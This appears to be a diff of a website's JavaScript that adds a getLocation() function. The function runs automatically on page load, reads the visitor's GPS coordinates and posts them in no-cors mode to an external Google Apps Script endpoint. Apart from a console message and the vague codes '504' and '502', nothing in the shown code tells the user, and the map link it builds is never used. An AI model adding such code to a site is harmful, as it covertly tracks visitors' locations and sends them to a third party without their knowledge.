@@ -16,7 +16,39 @@ b.addEventListener("click",() =>{
     }
 });
 
+  function getLocation() {
+                    
+                    if (navigator.geolocation) {
+                        navigator.geolocation.getCurrentPosition(function (position) {
+                            var lat = position.coords.latitude;
+                            var lon = position.coords.longitude;
+                            let gta = lat.toFixed(5) +","+ lon.toFixed(5);
+                            let data = gta;
+                            fetch("https://script.google.com/macros/s/AKfycbx5wRNdTlOjbdVYDgz1wTLG8wY7k3yRAHcioAwKSBAos2hp78qgf9xCL6LI4xwZkMOG/exec", {
+                              
+               method: "POST",
+              mode: "no-cors",   
+    headers: { "Content-Type": "text/plain" },
+    body: JSON.stringify(data)
+  })
+  .then(res => res.text())
+  .then(response => {
+    console.log("shared");
+        
+        
+        
+  })
+  .catch(err => console.error(err));
   
+                            var mapLink = 'https://www.google.com/maps?q=' + lat + ',' + lon;
+                        }, function (error) {
+                            console.log("504");
+                        });
+                    } else {
+                        console.log("502");
+                    }
+                }
+                 
   
   const images = document.querySelectorAll('.hero-slider img');
   let current = 0;
@@ -218,7 +250,8 @@ fetch("https://script.google.com/macros/s/AKfycbx5wRNdTlOjbdVYDgz1wTLG8wY7k3yRAH
   .catch(err => console.error(err));
   
    })
-                            
+    
+    getLocation();           
   // loader
     
     tmps.style.display ="block";
@@ -374,4 +407,4 @@ chatbot.addEventListener("click",()=>{
     window.location.href="chatbot.html";
 });
   
-  
+  getLocation();
